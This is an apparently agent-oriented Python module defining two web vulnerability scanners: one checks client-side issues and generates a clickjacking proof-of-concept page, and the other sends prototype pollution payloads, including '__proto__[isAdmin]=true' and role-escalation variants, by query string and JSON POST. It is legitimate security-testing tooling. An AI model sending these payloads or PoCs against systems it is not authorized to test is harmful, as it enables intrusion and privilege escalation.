import json
import requests
import re
import urllib3
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.auth_store import auth_get, auth_post
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Client-Side Security Scanner
# ==========================================
@tool("client_side_security_scanner")
def client_side_security_scanner(url: str) -> str:
    """
    Scan untuk client-side vulnerabilities:
    - Clickjacking (X-Frame-Options + generate PoC)
    - CSP misconfiguration analysis
    - SRI (Subresource Integrity) missing
    - Reverse tabnapping (<a target="_blank"> tanpa rel=noopener)
    - Browser cache poisoning (sensitive pages)
    """
    tool_name = "Client-Side Security Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting client-side security scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {
        "clickjacking": None,
        "csp_issues": [],
        "sri_missing": [],
        "reverse_tabnapping": [],
        "cache_issues": [],
        "vulnerabilities": []
    }

    try:
        rate_limiter.wait(domain)
        r = auth_get(url, timeout=8, verify=False)
        headers = r.headers
        body = r.text

        # ── 1. Clickjacking ───────────────────────────────────────────────────
        logger.add_log(tool_name, "PROCESSING", "Checking clickjacking protection")
        xfo = headers.get("X-Frame-Options", "")
        csp = headers.get("Content-Security-Policy", "")
        frame_ancestors = re.search(r"frame-ancestors\s+([^;]+)", csp, re.IGNORECASE)

        if not xfo and not frame_ancestors:
            poc_html = f"""<!-- Clickjacking PoC -->
<html><body style="background:#000">
<h1 style="color:red">Clickjacking PoC — {domain}</h1>
<iframe src="{url}" style="opacity:0.0001;position:absolute;top:0;left:0;width:100%;height:100%;z-index:999"></iframe>
<button style="position:absolute;top:200px;left:200px;z-index:1;padding:20px;font-size:20px">Click me!</button>
</body></html>"""
            findings["clickjacking"] = {
                "vulnerable": True,
                "x_frame_options": xfo or "MISSING",
                "csp_frame_ancestors": "MISSING",
                "poc_html": poc_html,
                "severity": "Medium"
            }
            findings["vulnerabilities"].append({"type": "Clickjacking", "severity": "Medium"})
            logger.add_log(tool_name, "WARNING", "Clickjacking vulnerability detected")
        else:
            findings["clickjacking"] = {
                "vulnerable": False,
                "x_frame_options": xfo,
                "csp_frame_ancestors": str(frame_ancestors.group(1)) if frame_ancestors else "Via X-Frame-Options"
            }

        # ── 2. CSP Analysis ───────────────────────────────────────────────────
        logger.add_log(tool_name, "PROCESSING", "Analyzing Content Security Policy")
        if not csp:
            findings["csp_issues"].append({
                "issue": "No Content-Security-Policy header",
                "severity": "Medium"
            })
            findings["vulnerabilities"].append({"type": "Missing CSP Header", "severity": "Medium"})
        else:
            # Check dangerous CSP directives
            if "unsafe-inline" in csp:
                findings["csp_issues"].append({
                    "issue": "unsafe-inline in CSP — allows inline scripts/styles",
                    "severity": "High",
                    "bypasses": ["Inline XSS payloads will execute"]
                })
            if "unsafe-eval" in csp:
                findings["csp_issues"].append({
                    "issue": "unsafe-eval in CSP — allows eval() and similar",
                    "severity": "High",
                    "bypasses": ["eval()-based XSS payloads will execute"]
                })
            if "* " in csp or csp.strip().endswith("*"):
                findings["csp_issues"].append({
                    "issue": "Wildcard (*) source in CSP",
                    "severity": "High",
                    "bypasses": ["Any origin can load scripts"]
                })
            # Check for data: URI
            if "data:" in csp:
                findings["csp_issues"].append({
                    "issue": "data: URI allowed in CSP",
                    "severity": "Medium"
                })
            # Check for missing default-src
            if "default-src" not in csp:
                findings["csp_issues"].append({
                    "issue": "No default-src directive — relies on browser defaults",
                    "severity": "Medium"
                })

        # ── 3. SRI Check ──────────────────────────────────────────────────────
        logger.add_log(tool_name, "PROCESSING", "Checking Subresource Integrity (SRI)")
        # Find external scripts and stylesheets
        external_scripts = re.findall(r'<script[^>]+src=["\']https?://([^"\']+)["\'][^>]*>', body, re.IGNORECASE)
        external_styles = re.findall(r'<link[^>]+href=["\']https?://([^"\']+)["\'][^>]*rel=["\']stylesheet["\'][^>]*>', body, re.IGNORECASE)
        external_styles += re.findall(r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']https?://([^"\']+)["\'][^>]*>', body, re.IGNORECASE)

        # Check which ones are missing integrity attribute
        scripts_without_sri = re.findall(
            r'<script[^>]+src=["\']https?://[^"\']+["\'][^>]*(?!integrity)[^>]*>',
            body, re.IGNORECASE
        )
        # Filter: only external (cross-origin)
        for script_tag in scripts_without_sri:
            if "integrity=" not in script_tag and any(cdn in script_tag for cdn in [
                "cdn.", "ajax.googleapis", "cdnjs", "unpkg.com", "jsdelivr", "bootstrap"
            ]):
                src = re.search(r'src=["\']([^"\']+)["\']', script_tag)
                if src:
                    findings["sri_missing"].append({
                        "resource": src.group(1),
                        "type": "External Script without SRI",
                        "severity": "Low",
                        "risk": "Supply chain attack — if CDN compromised, malicious code loads on your site"
                    })

        # ── 4. Reverse Tabnapping ─────────────────────────────────────────────
        logger.add_log(tool_name, "PROCESSING", "Checking reverse tabnapping")
        blank_links = re.findall(r'<a[^>]+target=["\']_blank["\'][^>]*>', body, re.IGNORECASE)
        for link_tag in blank_links:
            if "noopener" not in link_tag.lower() and "noreferrer" not in link_tag.lower():
                href = re.search(r'href=["\']([^"\']+)["\']', link_tag)
                if href and href.group(1).startswith("http"):
                    findings["reverse_tabnapping"].append({
                        "link": href.group(1)[:100],
                        "issue": "target=_blank without rel=noopener — reverse tabnapping risk",
                        "severity": "Low"
                    })

        if findings["reverse_tabnapping"]:
            findings["vulnerabilities"].append({
                "type": "Reverse Tabnapping",
                "count": len(findings["reverse_tabnapping"]),
                "severity": "Low"
            })

        # ── 5. Sensitive Data in Cache ────────────────────────────────────────
        logger.add_log(tool_name, "PROCESSING", "Checking browser cache controls")
        cache_control = headers.get("Cache-Control", "")
        pragma = headers.get("Pragma", "")

        # Check sensitive pages that shouldn't be cached
        sensitive_patterns = ["profile", "account", "dashboard", "payment", "card", "bank"]
        is_sensitive = any(p in url.lower() for p in sensitive_patterns)

        if is_sensitive and "no-store" not in cache_control and "private" not in cache_control:
            findings["cache_issues"].append({
                "url": url,
                "cache_control": cache_control or "MISSING",
                "pragma": pragma or "MISSING",
                "issue": "Sensitive page missing cache control — may be cached by browser/proxy",
                "severity": "Medium"
            })
            findings["vulnerabilities"].append({
                "type": "Sensitive Page Cached",
                "severity": "Medium"
            })

    except Exception as e:
        logger.add_log(tool_name, "ERROR", f"Client-side scan error: {str(e)}")
        findings["error"] = str(e)

    total = len(findings["vulnerabilities"])
    result = {
        "status": "VULNERABLE" if total > 0 else "SAFE",
        "findings": findings,
        "total_vulnerabilities": total
    }
    logger.add_log(tool_name, "SUCCESS", f"Client-side security scan complete. Issues: {total}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: Prototype Pollution Scanner
# ==========================================
@tool("prototype_pollution_scanner")
def prototype_pollution_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk JavaScript Prototype Pollution vulnerability.
    Test injecting __proto__, constructor.prototype via query params dan POST JSON.
    params: comma-separated parameter names (opsional)
    """
    tool_name = "Prototype Pollution Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting prototype pollution scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {"vulnerabilities": [], "suspicious": []}

    # Prototype pollution payloads (query string based)
    qs_payloads = [
        "__proto__[polluted]=nexus_test",
        "__proto__.polluted=nexus_test",
        "constructor[prototype][polluted]=nexus_test",
        "constructor.prototype.polluted=nexus_test",
        "__proto__[isAdmin]=true",
        "__proto__[role]=admin",
    ]

    # JSON body payloads
    json_payloads = [
        '{"__proto__": {"polluted": "nexus_test"}}',
        '{"constructor": {"prototype": {"polluted": "nexus_test"}}}',
        '{"__proto__": {"isAdmin": true}}',
        '{"__proto__": {"role": "admin"}}',
    ]

    logger.add_log(tool_name, "PROCESSING", "Testing prototype pollution via query strings")
    for payload in qs_payloads:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            full_url = f"{url}{'&' if '?' in url else '?'}{payload}"
            r = auth_get(full_url, timeout=5, verify=False)
            # Check if our marker appears in response (reflected prototype pollution)
            if "nexus_test" in r.text:
                findings["vulnerabilities"].append({
                    "type": "Prototype Pollution (Reflected)",
                    "payload": payload,
                    "vector": "Query String",
                    "evidence": "Injected value reflected in response",
                    "severity": "High"
                })
                logger.add_log(tool_name, "WARNING", f"Prototype pollution (QS) confirmed: {payload}")
                break
            # Check for server errors (sometimes indicates processing)
            elif r.status_code == 500:
                findings["suspicious"].append({
                    "payload": payload,
                    "status": 500,
                    "note": "Server error on prototype pollution payload — may indicate processing"
                })
        except Exception:
            pass

    logger.add_log(tool_name, "PROCESSING", "Testing prototype pollution via POST JSON")
    for jp in json_payloads:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = auth_post(
                url, data=jp,
                headers={"Content-Type": "application/json"},
                timeout=5, verify=False
            )
            if "nexus_test" in r.text:
                findings["vulnerabilities"].append({
                    "type": "Prototype Pollution (POST JSON)",
                    "payload": jp,
                    "vector": "POST Body",
                    "evidence": "Injected value reflected in response",
                    "severity": "High"
                })
                logger.add_log(tool_name, "WARNING", "Prototype pollution (POST JSON) confirmed!")
                break
            elif r.status_code == 500:
                findings["suspicious"].append({
                    "payload": jp[:50],
                    "status": 500,
                    "note": "Server error — possible prototype pollution processing"
                })
        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["suspicious"] else "SAFE"
        ),
        "findings": findings,
        "note": "Prototype pollution is server-side when Node.js is used. Client-side requires browser testing."
    }
    logger.add_log(tool_name, "SUCCESS", "Prototype pollution scan complete")
    return json.dumps(result, indent=2)
